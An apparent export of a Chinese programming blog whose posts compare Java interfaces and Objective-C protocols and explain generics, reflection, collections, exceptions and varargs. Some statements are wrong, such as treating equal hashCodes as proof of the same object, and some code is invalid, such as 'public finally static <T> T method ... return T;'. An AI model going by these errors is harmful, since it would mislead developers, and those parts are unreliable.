多实现和多遵守由于Java和Object-C都是单继承的语言，所以说要实现多个多态时，就出现了类似的多实现和多遵守 //Class文件中在implements中添加多个Interface public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, Serializable &#123;&#125; //在.m文件中再次声明一次interface了BaseObject接口，然后通过&lt;&gt;遵守多个Protocol @interface BaseObject : NSObject &lt;UITextFieldDelegate,PGTextFieldDelegate,UIAlertViewDelegate&gt; @end @implementation BaseObject @end 谁可以当指针根据多实现和单实现的来看，谁可以当指针呢 //Java //本身当指针 ArrayList arrayList = new ArrayList&lt;&gt;(); //某个父类当指针 Object object = new ArrayList&lt;&gt;(); //某个接口当指针 List list = new ArrayList&lt;&gt;(); Serializable serializable = new ArrayList&lt;&gt;(); //Objective-C //某个父类当指针 NSObject *object = [[BaseObject alloc]init]; //本身当指针 BaseObject *baseObject = [[BaseObject alloc]init]; //Protocol 不能当指针 但是可以使用模版类id加上遵守某个协议 //代表指向任意遵守协议UITextFieldDelegate类型的对象 id&lt;UITextFieldDelegate&gt; basePoint = [[BaseObject alloc]init]; 有趣的是在OC里的id显示其Class是「T」，其相当于Java中的T模板感觉上 总结由上可知，虽然都是「面向接口编程」但是 Java的Interface本身就是类，而OC的Interface是类的定义 Java的Implements是多态的实现，而OC的Implementation是类的实现 Java的Implements等同于OC中对协议的遵守","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"Protocol协议的公开和非公开实现","date":"2016-03-23T15:00:00.000Z","path":"2016/03/24/Protocol协议的私有实现和公开实现/","text":"如何让协议的函数非公开如果我想让遵守协议的Object，其协议方法为『非公开实现』，只需要在「.m」文件里的interface后声明遵守协议。 //FatherObject.h #import &lt;Foundation/Foundation.h&gt; //协议 @protocol FatherDelegate &lt;NSObject&gt; @required - (void)doDelegateMthod; @end //父类 @interface FatherObject : NSObject @property (nonatomic, weak) id&lt;FatherDelegate&gt; delegate; @end //FatherObject.m #import &quot;FatherObject.h&quot; //在此处的Extends后声明遵守协议 @interface FatherObject () &lt;FatherDelegate&gt; @end @implementation FatherObject - (void)doDelegateMthod &#123; NSLog(@&quot;Do Delegate Method In Father&quot;); &#125; @end 如何让协议的函数公开如果我想让遵守协议的Object，其协议方法为『公开实现』，只需要在「.h」文件里的interface后声明遵守协议。 //FatherObject.h #import &lt;Foundation/Foundation.h&gt; //协议 @protocol FatherDelegate &lt;NSObject&gt; @required - (void)doDelegateMthod; @end //父类 //在此处的Interface后声明遵守协议 @interface FatherObject : NSObject &lt;FatherDelegate&gt; @property (nonatomic, weak) id&lt;FatherDelegate&gt; delegate; @end //FatherObject.m #import &quot;FatherObject.h&quot; @implementation FatherObject - (void)doDelegateMthod &#123; NSLog(@&quot;Do Delegate Method In Father&quot;); &#125; @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Protocol","slug":"Protocol","permalink":"http://yoursite.com/tags/Protocol/"}]},{"title":"继承对Java的Interface和OC的Protocol的影响","date":"2016-03-23T15:00:00.000Z","path":"2016/03/24/继承对Java的Interface和OC的Protocol的影响/","text":"Java中继承对Interface的影响今天在总结Java和OC中Interface/Implement/Protocol的时候顺便逼逼了面向对象语言的吹逼就想到了一些特性还没有确定，就测试了一下 //接口1 public interface FirstInterface &#123; void doFirstMethod(); &#125; //接口2继承于接口1 public interface SecondInterface extends FirstInterface &#123; void doSecondInterface(); &#125; //实现接口2的Class会要求实现接口1 public class FatherImpl implements SecondInterface &#123; @Override public void doFirstMethod() &#123; System.out.print(&quot;Do First Method In FirstImpl&quot;); &#125; @Override public void doSecondInterface() &#123; System.out.print(&quot;Do Second Method In FirstImpl&quot;); &#125; &#125; //继承了实现接口2的Class不要求实现接口2 //但是可以对父类的接口函数进行重载 public class ChildImpl extends FatherImpl &#123; @Override public void doFirstMethod() &#123; System.out.print(&quot;Do First Method In ChildImpl&quot;); &#125; @Override public void doSecondInterface() &#123; System.out.print(&quot;Do Second Method In ChildImpl&quot;); &#125; &#125; OC中继承对Protocol的影响OC中不管协议在父类中是私有的还是公开的Protocol协议的公开和非公开实现，在子类中都可以对其进行重载，只不过一个有代码提示一个没有代码提示罢了，[Child selector]向子类发消息，如果子类有同名函数，就会执行子类的，这是OC的消息机制决定的，可以看MethodSwizzling方法hook函数 //FatherObject.h #import &lt;Foundation/Foundation.h&gt; //协议1 @protocol FatherFirstDeletgate &lt;NSObject&gt; @required - (void)doFirstMethod; @end //协议2本身遵守协议1 @protocol FatherSecondDelegate &lt;NSObject,FatherFirstDeletgate&gt; @required - (void)doSecondMthod; @end //父类 @interface FatherObject : NSObject @property (nonatomic, weak) id&lt;FatherSecondDelegate&gt; delegate; @end //FatherObject.m #import &quot;FatherObject.h&quot; //父类要求遵守协议2 @interface FatherObject () &lt;FatherSecondDelegate&gt; @end //父类要求实现协议1和协议2中所有required的方法 @implementation FatherObject - (void)doFirstMethod &#123; NSLog(@&quot;Do First Method In Father&quot;); &#125; - (void)doSecondMthod &#123; NSLog(@&quot;Do Second Method In Father&quot;); &#125; @end //ChildObject.h #import &quot;FatherObject.h&quot; //子类继承于父类 @interface ChildObject : FatherObject @end //ChildObject.m #import &quot;ChildObject.h&quot; //子类不要求实现协议1和协议2 @implementation ChildObject @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"面向对象语言的吹逼","date":"2016-03-23T15:00:00.000Z","path":"2016/03/24/面向对象语言的吹逼/","text":"从面向对象讲起本来这篇文章是想作为对Java和OC中Interface/Implement/Protocol的一个补充，结果越写越多，就单独作为一个文章列出。 大学里学习计算机Tuber C的时候就讲到一个基础的概念的 C是面向过程的语言 C++等是面向对象的语言 我觉得90%的人都没搞明白怎么回事，但是肯定记得一句话，因为期末考试必考，面向对象语言的三个特性『封装』『继承』『多态』 封装从Struct到ClassC中只有结构体，结构体只能组装基本的数据类型(int char之类的)，不能够加函数的，调用C的函数只能书写函数名，也就是说逻辑处理功能是独立于数据的。这样使用者在完成逻辑功能时就需要满足以下条件 我要使用哪些数据 然后我要使用哪些函数 这样明显显得比较笨，代码一旦多起来，很多人不知道哪些数据可以用于哪些函数，而且一个一个去找这些函数也很麻烦。 所以人们就诞生了面向对象编程的概念Class，数据和方法放在一起，称为Object(对象)，这样使用者只需要记住 我要使用哪个Object 数据和逻辑处理全部放在Object里，查找起来也很方便 PS: 结构体Struct如果想调用函数，需要把C语言函数的指针存在一个变量放入结构体，其实Class也是基于这个原理。 以上把函数放入结构体，并起了个新名字的过程就是封装的过程，并且产生了「Class」「Object」的概念 Java和OC的封装Java是基于C++而OC是C的超集，同样是面向对象的语言，自然就会有自己的Class和Object //Java中所有的Class都默认继承了这个类 public class Object &#123;&#125; //OC就比较喜欢敞开大屌说亮话，你声明的所有类都会继承于这个类 @interface NSObject &lt;NSObject&gt; &#123; Class isa OBJC_ISA_AVAILABILITY; &#125; @end 例如 //Java虽然没有extends但是也继承于Object public class BaseObject &#123;&#125; //OC肯定会继承于NSObject @interface BaseObject : NSObject @end 继承面向对象的语言都具有继承特性，可以获得另外一个相同定义的所有公开的成员变量和方法，注意这里用到的是『相同定义』 //Java中的接口只能继承接口 public interface Collection&lt;E&gt; extends Iterable&lt;E&gt; &#123;&#125; public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123;&#125; //Java中的类继承只能继承类 public abstract class AbstractList&lt;E&gt; extends AbstractCollection&lt;E&gt; public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; //OC中只有类有继承 @interface BaseObject : NSObject @end 这里需要强调下Java和OC都是单继承，不能同时继承多个类，如果要继承2个类就需要用3个Class分两层继承。 多态多台是指同一个函数，可以有多个可能的实现，但是函数名一样，这里就不细讲了，去看教科书的画圆形画正方形画长方形的举例吧。 多态为了解决什么问题呃。。还是简单说下吧。。。比如有个函数叫countSum()，有两个类都有这个方法 A.countSum() //输出了Asum B.countSum() //输出了Bsum 正常情况下是怎么发生的，当然会说因为我在AB中都写了countSum函数并写了不同的逻辑，但是如果你写上100个Class，你能保证每次你起的函数名都不拼错么 就是为了解决这个问题，所以提出了多态机制是使用同个函数名，但是可以产生不同输出的机制 多态的机制后来高级码农发现了两个问题 我只想起好函数名，大家都用我这个名字，具体干嘛让小弟去写好了 妈蛋虽然我比较NB，但是我感觉这个函数还是有问题，干脆暂时先用着谁看着不爽再自己重新写一遍好了，但是不能让他改我现在的。 这里就提出了多态的基本概念「仅有函数定义的多态」「通过重载获得的多态」 仅有函数定义的多态(问题1)就是只起好函数名，具体实现没写，既然没有实际代码，那也就没有实例化的需求了，所以这样的概念不管在哪个语言里，仅仅是Class定义，不可能有Object C++ Java Object-C 实现 pure virtual interface protocol 特点 仅能在在基类中定义 interface都不能new protocol不能alloc 通过这种手段确定好函数名，而且解决了问题1 通过继承和重载获得的多态(问题2)根据面向对象的基本要求『继承』会使得两个Object获得相同的的函数，那么在子函数里再次书写该函数的时候，就可以得到不同的逻辑。 通过抽象类获得多态(问题2)后来人们发现，我需要实现一些简单的逻辑，但是又只想让你继承我的来使用，不要实例化我这个类本身，因为逻辑不全，你看着不爽的地方可以继承之后改掉。这个就是「抽象类」的概念。 C++ Java Object-C 实现 abstract class abstract class 无 特点 不能实例化且只能是基类 不能被实例化,可以继承其它abstract 无 但是在Objective-C中不存在抽象类这个概念。 多态的总结 任何语言都可以通过继承后重载方法进行多态的实现 除此之外 C++的多多态就是『抽象类』和『虚函数』『纯虚函数』 因为Java是基于C++的所以其对多态有进行了整理，包括『抽象类』『接口类』 Object-C表示尼玛搞的这么复杂，只支持了『Protocol』协议 其中不能实例化的是 C++ Java Object-C 抽象类/包含纯虚函数的类 抽象类/接口类 Protocol 其中C++是最为灵活的，只要声明了纯虚函数或者抽象类就可以防止别人进行实例化 Java把C++中「仅包含纯虚函数不包含成员变量的类」称之为「接口类」，并且和C++可以多继承不同，接口只可以实现，Java用单继承多实现的方式完成了多继承。 而Objective-C因为和C++没有半毛钱关系,所以只采取了Protocol一种方法实现多态，而且和Java一样通过单继承多协议来完成多继承的功能 !!!但是这里要注意!!!一个关键的问题来了 由于Java基于C++，Java的Interface本质还是类,而Objective-C不同，Protocol本身和类没有关系!!!!所以说 『Java的Interface ≠ OC的Protocol』 OC无函数重写的多态都讲到了这里，还有一个点没有讲到，就是Java和C++都拥有的一个特性，函数重写 void method(int a); int method(int a); void method(char a); 在C++和Java中如果使用同一个函数名且入参个数相同的时候，在「返回值」「参数类型」有一个不同的时候，都会被编译器判定为不同的函数，也算是一种「变相的多态」，因为C++在编译时，函数是会读返回值和参数的，你只关心了函数名，觉得是一种多态，严格来讲，编译器认为它们本来就是不同的函数，不存在多态。 但是OC呢 - (void)method:(NSString *) parameter key:(NSString *)key; - (void)method:(NSString *) parameter2 key:(UIView *)view; 对于OC的编译器来说，它只读取函数的命名，并且不读取参数的类型，所以说以上两个函数在编译器看来都是 method:key: 这个在创建selector的时候经常会碰到，所以说OC不能通过改变返回值和入参类型进行重写达到「变相的多态」","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"Iterator使用以及如何判断最后一个","date":"2016-03-22T15:00:00.000Z","path":"2016/03/23/Iterator使用以及如何判断最后一个/","text":"iterator是什么先去Java源代码看一下，iterator是一个接口，可以用来遍历任何实现了Collection的容器。 public interface Iterator&lt;E&gt; &#123; boolean hasNext(); E next(); void remove(); &#125; iterator怎么使用Iterator可以从「List」「Set」获得 List list = new ArrayList&lt;&gt;(); Set set = new HashSet(); Iterator listIterator = list.iterator(); Iterator setIterator = set.iterator(); 原因是它们两个都实现了Collection的接口，从定义看 public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123; ... &#125; public interface Set&lt;E&gt; extends Collection&lt;E&gt; &#123; ... &#125; 然后根据接口函数 //是否还有下一个 boolean hasNext(); //下一个 E next(); //删除 void remove(); 就可以操作这个迭代器 while (iterator.hasNext()) &#123; Object object = iterator.next(); .... &#125; 关于最后一个的判断但是第一次看到的时候我是蒙逼的(°_°)，桥多麻袋～为什么只有「next」，最后一个再取next不就越界了么？怎么判断当前是最后一个呢。。。仔细看了源代码后发现 /** * Returns the next element in the iteration. */ E next(); 这里使用了模板，next的函数的返回值是一个Object，取决于你容器里存的是什么，最关键的一个问题却又没有说(可能Java大神认为大家都知道了) 每次执行next()函数会返回内部一个对象 然后iterator本身会偏移「一个地址」 这也就是为什么iterator使用while循环进行遍历，而不是使用for循环 所以说 到了倒数第二个Object 执行iterator.hasNext()为true 执行next() 返回倒数第二个Object，iterator偏移到最后一个Object 执行iterator.hasNext()为false 所以说可以通过hasNext()判断是不是最后一个。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Java中Class/Object/T的关系","date":"2016-03-22T15:00:00.000Z","path":"2016/03/23/Java中ClassObjectT的关系/","text":"Object 对象Object是Java中的基类，大部分的对象都是继承于这个类。 public class Object &#123; .... public native int hashCode(); public boolean equals(Object obj) &#123; ... &#125; public String toString() &#123; ... &#125; &#125; 以上是其定义，可以看出来其定义了一些基础方法，比如hashCode等等。 Class类的类「Class类」是其本身也是一个类，且不可以继承，它指向的是「实例的定义」是「类的类」 注意本文中「Class类」和「Class」意思不同，前者指的是『public final class Class』，后者值得是『类这个概念』 public final class Class&lt;T&gt; implements java.io.Serializable, java.lang.reflect.GenericDeclaration, java.lang.reflect.Type, java.lang.reflect.AnnotatedElement &#123; ...... &#125; 可以看得出其本身实现了一些接口，主要是反射中的。 T 模板T是代表模板，可以「代表任何Object」，其主要是放在各种单书名号中，一般是类名或者问号。 问号代表不确定 名字代表确定 T则代表任意一个「继承于Object的类」 T控制返回值当要使用T时需要通过「中括号T」来声明，其相当于finally或者static之类的限定符号 public finally static &lt;T&gt; T method(Class&lt;T&gt; clazz) &#123; return T; &#125; 除去方法的限定词 T method(Class&lt;T&gt; clazz)； 该方法是一个返回值为T,入参为任意「Class类」的方法 返回值根据传入的对象确定 返回的是「Class类」的一个实例化Object。 控制容器内容public static &lt;T&gt; List&lt;T&gt; select(T object); 根据输入参数T可以保证返回的List对象中全部都为T的实例。 T用于强行转换由于T本身作为一个模板，所以也可以用于强行类型转换 List&lt;T&gt; list = (List&lt;T&gt;) object; resultList.add((T) BeanMapperUtil.objConvert(tempDO,objectBO.getClass())); Class/Class类/Object/T的逻辑关系如上总结 「Class类」是一个「Class」和Object同一级别，且不可以被继承 Object代表对象，是实例，实例就是某个「Class」的new实例化 T则是代表任意一个继承于Object的「Class」 看上去还是很晦涩，所以就拿String进行举例 class SomeObject extends Object &#123; T method(Class&lt;T&gt; clazz)； &#125; SomeObject some = new SomeObject(); Class clazz = some.getClass(); SomeObject someT = some.method(clazz); 它的「Class」是「someObject」，它的实例some是一个「Object」 「class SomeObject extends Object」可以被一个「Class类」的实例clazz指向 当method被调用，输入了clazz，返回值就是「someObject」,那么T就是「someObject」这段字符 妈蛋 还是很晦涩。。。。。我也不知道该怎么讲了。。。总之，你感觉感觉。。。 关于「Class」这个概念，就是类这个概念如何产生的，可以看另外一个文章面向对象语言的吹逼","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Java反射中的类/方法/参数","date":"2016-03-22T15:00:00.000Z","path":"2016/03/23/Java反射中的类方法参数/","text":"什么是反射反射是一种运行时(Runtime)机制，是在运行时动态生成和加载类，实例，然后执行函数，不仅Java中，OC中也有，详情见我另一片文章字符串生成Class&amp;Selector&amp;Protocol. 反射是整个web框架的基础，详情可以看Web框架学习反射工具 反射如何用从编程语言来讲，最基础的东西就是类「Class」，然后是类中的成员变量「Field」和方法「Method」 至于为什么成员变量叫Field而不是Parameter我也十分不能理解….. 类和实例在反射中要明白的一个概念是类和实例的关系，即Class和Instance。一句话概括是类是定义，而实例是内存中实际存在的对象 一个类可以有多个实例，取决于你new了多少个，所以说你要操作某个成员变量或者方法时，是从类中获得，并在实例中执行。以方法为例，因为方法是在类中定义，所有实例都有这个方法，所以在执行时(invoke)你要指定时谁，哪个实例执行 Class&lt;?&gt; //这个是类的Java对象 Object //这个是实例的Java对象 //两者没有任何集成关系，都没有父类 类的反射虽然是类的反射，但是在实际运行的过程中，是通过新建类的实例来进行逻辑处理，所以通过以下代码可以得到一个类的实例 Class clazz = Class.forName(&quot;com.some.class&quot;); Object instance = clazz.newInstance(); 成员变量的反射成员变量是在类中定义的，所以说只要有类，不一定需要有实例就可以获得 Class clazz = Class.forName(&quot;com.some.class&quot;); Field[] publicFields = clazz.getFields();//获取Public成员变量 Field[] allFields = clazz.getDeclaredFields();//获取所有成员变量 Field field = clazz.getField(&quot;fieldName&quot;);//获得某个特别的成员变量 当需要对某个成员变量进行赋值等操作时，无法对某个Class进行赋值，而是对其某个Instance进行赋值，所以需要用Field的函数 field.set(instance,value) 其含义是对instance实例中的field进行赋value值。instance是clazz的一个实例。 方法的反射同成员变量一样，方法也可以通过方法名的字符串获得，其也是基于Class而不是Instance Class clazz = Class.forName(&quot;com.some.class&quot;); Method[] publicMethods = clazz.getMethods();//获取Public方法 Method[] allMethods = clazz.getDeclaredMethods();//获取所有方法 Method method = clazz.getDeclaredMethod(&quot;methodName&quot;,parameterTypes);//获得某个方法 与成员变量不同，方法不仅要有「名字」，还要有方法的入参，所以说还需要传入一个为Class数组的parameterTypes，如果不包含参数就传入null即可。 当得到了方法之后，就可以通过Class的实例和参数的实例进行触发该函数，其中args为一个Object的数组，是parameterTypes的Class数组中类的实例，且一一对应。 method.invoke(instance,args); 其含义是用args做为参数执行instance实例中的method函数。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"}]},{"title":"List/Set/Map的区别","date":"2016-03-22T15:00:00.000Z","path":"2016/03/23/ListSetMap的区别/","text":"List/Set/Map是什么数据容器先从计算机逻辑上来讲「List」「Set」「Map」三个都属于数据容器，这个容器的概念和Web容器是不一样的，但是总体来讲复合「什么叫做容器」这篇文章里我主张的容器的概念。 数据容器的主要特征是 有增删功能 内存空间是可变的 接口Interface然后从定义上来讲，这三个都属于接口，也就是说是一个抽象表达，并不是具体的Class，每一个都有多种可能的实现，并且可以对实现了该接口的实例进行指向。可以参考另一片文章「Java和OC中Interface/Implement/Protocol」 List/SetCollection接口List和Set均间接实现了「Collection」「Iterable」接口 public interface Collection&lt;E&gt; extends Iterable&lt;E&gt; &#123;&#125; public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123;&#125; public interface Set&lt;E&gt; extends Collection&lt;E&gt; &#123;&#125; List的实现根据查询源代码implements了List协议的Class有以下三个 @see ArrayList @see LinkedList @see Vector 查看定义 public class LinkedList&lt;E&gt; extends AbstractSequentialList&lt;E&gt; implements List&lt;E&gt;, Deque&lt;E&gt;, Cloneable, Serializable &#123;&#125; public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, Serializable &#123;&#125; public class Vector&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, Serializable &#123;&#125; 其中「AbstractList」「AbstractSequentialList」是作为它们的基类，而这两个是抽象类，抽象类和接口的关系同样可以参考「Java和OC中抽象类接口和协议」。 public abstract class AbstractList&lt;E&gt; extends AbstractCollection&lt;E&gt; implements List&lt;E&gt; &#123;&#125; public abstract class AbstractSequentialList&lt;E&gt; extends AbstractList&lt;E&gt; &#123;&#125; 所以说在使用List的时候，List可以当作通用指针，指向不同的new List array = new ArrayList&lt;&gt;(); List linked = new LinkedList(); List vector = new Vector(); Set的实现根据源代码「直接或间接」implements了Set协议的Class有以下两个 @see HashSet @see TreeSet 定义 public class HashSet&lt;E&gt; extends AbstractSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, Serializable &#123;&#125; public class TreeSet&lt;E&gt; extends AbstractSet&lt;E&gt; implements NavigableSet&lt;E&gt;, Cloneable, Serializable &#123;&#125; 之所以说是间接，是因为NavigableSet继承于Set public interface SortedSet&lt;E&gt; extends Set&lt;E&gt; &#123;&#125; public interface NavigableSet&lt;E&gt; extends SortedSet&lt;E&gt; &#123;&#125; 而它们的基类全部继承于一个抽象类「AbstractSet」 public abstract class AbstractSet&lt;E&gt; extends AbstractCollection&lt;E&gt; implements Set&lt;E&gt; &#123;&#125; 同List一样我们可以通过Set作为通用指针指向不同的new Set hashSet = new HashSet(); Set treeSet = new TreeSet(); MapMap没有实现Collection接口通过Map的接口定义可以看到其和List/Set最大的不同是没有实现Collection接口 public interface Map&lt;K,V&gt; &#123;&#125; Map的实现根据源代码「直接或间接」implements了Map协议的Class有以下三个 public class HashMap&lt;K, V&gt; extends AbstractMap&lt;K, V&gt; implements Map&lt;K, V&gt;, Cloneable, Serializable &#123;&#125; public class TreeMap&lt;K, V&gt; extends AbstractMap&lt;K, V&gt; implements NavigableMap&lt;K, V&gt;, Cloneable, Serializable &#123;&#125; public class Hashtable&lt;K, V&gt; extends Dictionary&lt;K, V&gt; implements Map&lt;K, V&gt;, Cloneable, Serializable &#123;&#125; 同Set一样，间接的原因是 public interface NavigableMap&lt;K,V&gt; extends SortedMap&lt;K,V&gt; &#123;&#125; public interface SortedMap&lt;K,V&gt; extends Map&lt;K,V&gt; &#123;&#125; 而它们的基类全部继承于两个不同的抽象类「AbstractMap」「Dictionary」 public abstract class AbstractMap&lt;K, V&gt; implements Map&lt;K, V&gt; &#123;&#125; public abstract class Dictionary&lt;K,V&gt; &#123;&#125; 可以使用Map作为通用指针指向任意一个new Map hashMap = new HashMap(); Map treeMap = new TreeMap(); Map hashTable = new Hashtable(); HashMap和Hashtable的区别为什么会有两个不同的抽象类呢，与List不管哪个类都继承于「AbstractList」抽象类不一样，「AbstractMap」和「Dictionary」没有任何关系。 通过查询资料得知Dictionary是比较老的版本提出的的，但是凭不是说其过时了 HashMap Hashtable 基类 AbstractMap Dictionary 是否同步 否 是 K/V是否可为null 是 否 通过以上表格可以知道，由于Dictionary是同步的，所以是线程安全的。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"什么叫做容器","date":"2016-03-22T15:00:00.000Z","path":"2016/03/23/什么叫做容器/","text":"什么叫做容器先上定义： 容器就是自动完成逻辑操作的计划执行者 (╯°Д°）╯︵ /(.□ . \\) 这说的是个屁啊 我们先来看看经常从哪里听到这个词 Web容器Tomcat是一个容器 这是写Web的人经常听到的一句话，这句话全文应该是 Tomcat是一个WebServlet容器 这里整理一下思路 「通常情况下」你放入Tomcat的.war包，是一个基于Servlet的程序包 其中有一个web.xml进行了一些配置 Tomcat会自动读取这些配置 并且让你的Servlet可以被访问 Tomcat完成了把Session放入Cookie，把你的Request/Response生成Http报文等工作 现在聚焦在3-5步骤，这些操作是不是一些逻辑操作，你不需要自己手动去完成，只需要完成1-2步骤，3-5就会有Tomcat自己完成。 那么Tomcat就是3-5步骤的计划执行者 IOC容器Spring是一个容器 这个也是写Web的人经常听到的一句话，其实如同上文一样，准确的说应该是 Spring是一个IOC容器 观察Spring的使用 首先你在web.xml里配置使用了Spring的contextConfigLocation 然后根据你的配置加载Spring配置文件，通常为applicationContext.xml 在applicationContext里使用Bean配置就可以让程序自动实例化某些类 然后使用@Service和@Autowired就可以使用这些类 这些类都是单例模式且实现了IOC 用过Spring的都知道其最重要的特性就是IOC(控制反转)，那么在你执行了1-4之后，控制反转的第五步你好像什么都没做，但是IOC的过程是比较复杂的，参考Web框架基本流程 那么Spring就是第5步骤IOC过程的计划执行者 数据容器「List」「Set」「Map」都是数据容器 这句话怎么解释呢？如果有C语言经验的，应该知道最关键的一个问题「如何定义可变数组」，在计算机中数组是需要长度的，因为长度决定了需要分配多少内存。但是你怎么使用数据容器呢 声明一个List，并new出一个ArrayList的实例 添加一个元素 删除一个元素 看上去没什么不妥？但是思考一下 元素的个数改变了，那么是不是相当于数组的长度改变了？长度改变应该也会引起内存的改变，内存改变的过程谁在做？ 这就是问题所在了，在操作数据容器时，你不用关心内存怎么操作，只需要直接调用List的add函数即可。 那么List就是底层内存改变过程的计划执行者 而且根据文章List/Set/Map的区别，一个List有「LinkedList」「ArrayList」多种实现，它们都可以完成不同的底层内存变更操作，而不需要调用者关心。 总结一下根据上文蓝色字体的总结，不同的容器都会完成一定的逻辑功能，不需要开发者关心，只需要「放入容器」就可以了，所以说容器是个宽泛的概念，只要是能按照计划的前后顺序完成一些功能都可以叫做容器。","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Java中Exception机制","date":"2016-03-21T15:00:00.000Z","path":"2016/03/22/Java中Exception机制/","text":"Java中Exception机制Java中最基本的一个概念就是异常「Exception」以及对异常的处理Try…Catch…，对异常的处理手段有两种 Catch Throws 也就是说任何一个new出来的Exception对象，都应该在函数中被以上两个处理方式的至少一个进行处理 自定义的Exception除去Java本身默认的一些Exception(例如NullPointException,IOException)之外，也可以通过继承来自定义一些Exception public class CustomException extends Exception &#123; private String errorCode; //无参构造函数 public CustomException() &#123; super(); this.errorCode = Constants.DATABASE_EXCEPTION_FLAG; &#125; //构造函数 public CustomException(String errorCode, String message) &#123; super(message); this.errorCode = errorCode; &#125; //构造函数 public CustomException(String message) &#123; super(message); this.errorCode = Constants.FAIL_FLAG; &#125; &#125; 函数抛出Exception当函数中处理到某一步骤，产生了异常情况就可以向外抛出，然后调用该函数的地方需要对该异常进行处理，或继续抛出，再不断抛出的过程中，最终必须是Catch处理，不然程序就会崩溃(对应的WebApp就是显示错误页面) void methodA() throws Exception &#123; .... throw new Exception(); return; &#125; void methodB() throws Exception &#123; this.methodA(); ..... //这里的代码在A抛出异常后就不会执行 return; &#125; void methodC() &#123; try &#123; this.methodB(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; ..... //这里的代码在catch住异常后可以继续执行 &#125; 这种处理逻辑一般称之为向上抛出。 Catch异常的顺序try…catch…中可以对不同异常进行不同的catch处理，但是catch「Exception类」必须放在最后，因为Exception类是所有其它异常的基类，可以指向任何一个异常，放在前面所有的异常都会被catch到 try &#123; this.methodB(); &#125; catch (CustomException e) &#123; e.printStackTrace(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; 感觉有点像switch…case…里的default选项。 函数应该Throws什么在刚刚到向上抛出异常的函数中，我们全部用的都是「Exception类」，如同catch异常顺序一样，Exception具有通用性，所以不管内部产生什么异常都可以被throws出来。 void methodA() throws Exception &#123; .... throw new CustomException(); return; &#125; void methodB() throws CustomException &#123; .... throw new Exception(); return; &#125; 以上两种情况有什么区别呢 逻辑成立的区别在MethodA中逻辑是城里的，会抛出一个Exception指针，指向一个CustomException对象。 在methodB中由于new的是Exception，但是抛出的是CustomException，而CustomException为子类，所以程序会报错，相当于Exception没有处理。 代码自动补全的区别在intelliJ中，有try…catch…自动补全功能，在对methodA进行自动补全，catch里补全的是「Exception类」，而对methodB进行补全的时候，补全的是「CustomException类」。所以说自动补全只和throws后紧跟的类有关 Throws多个异常除了通过Exception进行通用指针指向之外，还可以同时丢出多个异常，这样自动补全就会全部补全上 void methodA() throws Exception,CustomException &#123; .... throw new CustomException(); return; &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Exception","slug":"Exception","permalink":"http://yoursite.com/tags/Exception/"}]},{"title":"Java中的地址问题和Hashcode","date":"2016-03-21T15:00:00.000Z","path":"2016/03/22/Java中的地址问题和Hashcode/","text":"Java中的地址Java中并没有在基类中开放对象的地址，如果判断两个对象是不是同一对象，就需要通过「Hashcode」，通常情况下如果两个对象的Hashcode一致，就认为是一个对象。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Java函数的可选多参数String...","date":"2016-03-21T15:00:00.000Z","path":"2016/03/22/Java函数的可选多参数/","text":"Java中的可选多参数Java可以通过「…」进行多选参数输入,不仅可以使用String也可以是Object等任意类型 public void someMethod(Object param1, String... strings); 在调用时可以通过以下不同方式调用 someMethod(object,&quot;first&quot;,&quot;second&quot;,&quot;third&quot;); someMethod(object,&quot;first&quot;,&quot;second&quot;); someMethod(object,&quot;first&quot;); 在someMethod内部strings是一个根据你传入的参数个数不同，生成不同长度的「String[]」数组 public void someMethod(Object param1, String... strings) &#123; int length = strings.length(); String firstStr = strings[0]; &#125; 需要注意的是，可变长度参数必须是为最后一个，且一个函数仅能有一个。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Parameter","slug":"Parameter","permalink":"http://yoursite.com/tags/Parameter/"}]},{"title":"Java的目录结构","date":"2016-03-21T15:00:00.000Z","path":"2016/03/22/Java的目录结构/","text":"Java的目录结构Java的目录是用户手动创建的，但是由于Java和OC不一样，有多个IDE所以大家都会遵循一定的目录规范，然后用IDE的设置制定目录的用处 IntelliJ的目录设置Java的目录主要是分为「Sources」「Tests」「Resources」「Test Resources」「Exclude」几个目录，先上一张IntelliJ的「Project Structure」设置的图 可以看到不同的目录会用不同的颜色和图标标记出来 Java目录的功能目录可以通过IDE指定，但是他们的功能是确定的 Sources Path: 存放java源文件，一般声明为java，内部就是Java包 Test Sources Path: 存放java源文件的测试文件，一般和java的目录结构相同 